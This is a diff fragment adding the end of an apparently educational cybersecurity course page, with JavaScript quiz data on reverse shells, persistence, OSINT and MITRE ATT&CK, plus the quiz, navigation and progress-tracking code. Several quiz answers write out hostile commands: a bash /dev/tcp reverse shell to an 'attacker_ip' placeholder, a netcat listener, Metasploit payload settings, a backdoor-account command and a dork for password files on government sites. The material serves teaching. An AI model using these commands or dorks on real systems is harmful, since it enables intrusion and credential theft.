+                            "All of the above"
+                        ],
+                        correct: 3
+                    },
+                    {
+                        question: "Which of these is a characteristic of nation-state cyber operations?",
+                        options: [
+                            "Use of custom malware",
+                            "Long-term persistence",
+                            "High level of resources",
+                            "All of the above"
+                        ],
+                        correct: 3
+                    }
+                ]
+            },
+            quiz10: {
+                title: "Reverse Shells & Remote Code Execution (RCE)",
+                questions: [
+                    {
+                        question: "What is the purpose of a reverse shell?",
+                        options: [
+                            "To encrypt communication between systems",
+                            "To establish a connection from target to attacker",
+                            "To hide malicious activity from detection",
+                            "To escalate privileges on a system"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which command sets up a listener for a reverse shell?",
+                        options: [
+                            "nc -lvnp 4444",
+                            "bash -i >& /dev/tcp/attacker_ip/4444 0>&1",
+                            "use exploit/multi/http/php_exec",
+                            "set payload linux/x86/meterpreter/reverse_tcp"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "What is Meterpreter primarily used for?",
+                        options: [
+                            "Network scanning",
+                            "Post-exploitation",
+                            "Vulnerability assessment",
+                            "Password cracking"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz11: {
+                title: "Persistence & Privilege Escalation",
+                questions: [
+                    {
+                        question: "Which Windows registry key is commonly modified for persistence?",
+                        options: [
+                            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            "HKLM\\Software\\Microsoft\\Windows Defender",
+                            "HKCU\\Software\\Adobe\\Reader",
+                            "HKLM\\System\\CurrentControlSet\\Services"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "What command adds a hidden user in Windows?",
+                        options: [
+                            "net user backdoor Pass123! /add",
+                            "useradd -m backdoor",
+                            "adduser backdoor --hidden",
+                            "net localgroup administrators backdoor /add"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "What is a kernel exploit?",
+                        options: [
+                            "A vulnerability in application software",
+                            "A flaw in the operating system core",
+                            "A weakness in network protocols",
+                            "An issue with web application frameworks"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz12: {
+                title: "OSINT for Advanced Targeting",
+                questions: [
+                    {
+                        question: "What type of systems would 'shodan search \"port:502 Modbus\"' likely find?",
+                        options: [
+                            "Web servers",
+                            "Industrial control systems",
+                            "Database servers",
+                            "Remote desktop services"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which Google Dork would help find Excel files containing passwords on government sites?",
+                        options: [
+                            "site:.gov filetype:xls intext:\"password\"",
+                            "site:.gov filetype:pdf \"confidential\"",
+                            "site:.edu filetype:sql intext:\"admin\"",
+                            "intitle:\"login\" site:.gov"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "What is Maltego primarily used for in OSINT?",
+                        options: [
+                            "Port scanning",
+                            "Link analysis and visualization",
+                            "Password cracking",
+                            "Vulnerability scanning"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz13: {
+                title: "MITRE ATT&CK Mapping",
+                questions: [
+                    {
+                        question: "Which MITRE ATT&CK technique ID corresponds to Command Execution?",
+                        options: [
+                            "T1059",
+                            "T1078",
+                            "T1027",
+                            "T1033"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "What does T1078 (Valid Accounts) refer to?",
+                        options: [
+                            "Creating new user accounts",
+                            "Using stolen or legitimate credentials",
+                            "Brute forcing account passwords",
+                            "Bypassing authentication mechanisms"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which technique involves hiding malicious code or activity?",
+                        options: [
+                            "T1059 - Command and Scripting Interpreter",
+                            "T1078 - Valid Accounts",
+                            "T1027 - Obfuscated Files or Information",
+                            "T1033 - System Owner/User Discovery"
+                        ],
+                        correct: 2
+                    }
+                ]
+            }
+        };
+
+        // Navigation between days
+        document.querySelectorAll('.nav-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                // Remove active class from all buttons and content
+                document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.day-content').forEach(content => content.classList.remove('active'));
+                
+                // Add active class to clicked button
+                this.classList.add('active');
+                
+                // Show corresponding content
+                const dayId = this.getAttribute('data-day');
+                document.getElementById(`day${dayId}`).classList.add('active');
+            });
+        });
+        
+        // Progress tracking
+        const checkboxes = document.querySelectorAll('.day-checkbox input');
+        const progressFill = document.getElementById('progress-fill');
+        
+        function updateProgress() {
+            const checkedCount = Array.from(checkboxes).filter(cb => cb.checked).length;
+            const progressPercentage = (checkedCount / checkboxes.length) * 100;
+            progressFill.style.width = `${progressPercentage}%`;
+            
+            // Save progress to localStorage
+            const progress = {
+                day1: document.getElementById('day1-check').checked,
+                day2: document.getElementById('day2-check').checked,
+                day3: document.getElementById('day3-check').checked
+            };
+            localStorage.setItem('week4-progress', JSON.stringify(progress));
+        }
+        
+        // Load saved progress
+        const savedProgress = localStorage.getItem('week4-progress');
+        if (savedProgress) {
+            const progress = JSON.parse(savedProgress);
+            document.getElementById('day1-check').checked = progress.day1;
+            document.getElementById('day2-check').checked = progress.day2;
+            document.getElementById('day3-check').checked = progress.day3;
+            updateProgress();
+        }
+        
+        // Add event listeners to checkboxes
+        checkboxes.forEach(checkbox => {
+            checkbox.addEventListener('change', updateProgress);
+        });
+        
+        // Quiz functionality
+        const quizModal = document.getElementById('quiz-modal');
+        const quizContent = document.getElementById('quiz-content');
+        const closeModal = document.querySelector('.close-modal');
+        
+        // Open quiz when quiz button is clicked
+        document.querySelectorAll('.btn-quiz').forEach(button => {
+            button.addEventListener('click', function() {
+                const quizId = this.getAttribute('data-quiz');
+                openQuiz(quizId);
+            });
+        });
+        
+        // Close modal when X is clicked
+        closeModal.addEventListener('click', function() {
+            quizModal.style.display = 'none';
+        });
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', function(event) {
+            if (event.target === quizModal) {
+                quizModal.style.display = 'none';
+            }
+        });
+        
+        function openQuiz(quizId) {
+            const quiz = quizzes[quizId];
+            if (!quiz) return;
+            
+            let html = `<h2>${quiz.title} - Quiz</h2>`;
+            
+            quiz.questions.forEach((q, index) => {
+                html += `
+                    <div class="quiz-question">
+                        <p><strong>${index + 1}. ${q.question}</strong></p>
+                        <div class="quiz-options">
+                `;
+                
+                q.options.forEach((option, optIndex) => {
+                    html += `
+                        <div class="quiz-option">
+                            <input type="radio" id="q${index}o${optIndex}" name="q${index}" value="${optIndex}">
+                            <label for="q${index}o${optIndex}">${option}</label>
+                        </div>
+                    `;
+                });
+                
+                html += `</div></div>`;
+            });
+            
+            html += `<button class="quiz-submit" data-quiz="${quizId}">Submit Answers</button>`;
+            html += `<div class="quiz-result" id="quiz-result"></div>`;
+            
+            quizContent.innerHTML = html;
+            quizModal.style.display = 'flex';
+            
+            // Add event listener to submit button
+            document.querySelector('.quiz-submit').addEventListener('click', function() {
+                submitQuiz(quizId);
+            });
+        }
+        
+        function submitQuiz(quizId) {
+            const quiz = quizzes[quizId];
+            let score = 0;
+            const resultDiv = document.getElementById('quiz-result');
+            
+            quiz.questions.forEach((q, index) => {
+                const selected = document.querySelector(`input[name="q${index}"]:checked`);
+                if (selected && parseInt(selected.value) === q.correct) {
+                    score++;
+                }
+            });
+            
+            const percentage = (score / quiz.questions.length) * 100;
+            resultDiv.innerHTML = `
+                <div class="${percentage >= 70 ? 'quiz-success' : 'quiz-error'}">
+                    <p><strong>Your Score: ${score}/${quiz.questions.length} (${percentage.toFixed(1)}%)</strong></p>
+                    <p>${percentage >= 70 ? 'Well done! You have a good understanding of this topic.' : 'Keep studying! Review the material and try again.'}</p>
+                </div>
+            `;
+            resultDiv.style.display = 'block';
+            
+            // Scroll to result
+            resultDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+    </script>
+</body>
+</html>
